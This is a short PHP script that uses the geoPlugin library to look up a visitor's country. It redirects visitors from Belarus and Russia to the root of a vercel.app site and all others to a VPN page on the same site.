<?php
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
// create a variable for the country code
$var_country_code = $geoplugin->countryCode;
// redirect based on country code:
if ($var_country_code == "BY") {
header('Location: http://otliz.vercel.app/');
}
else if ($var_country_code == "RU") {
header('Location: http://otliz.vercel.app/');
}
else {
header('Location: https://otliz.vercel.app/vpn/index.html/');
}
?>
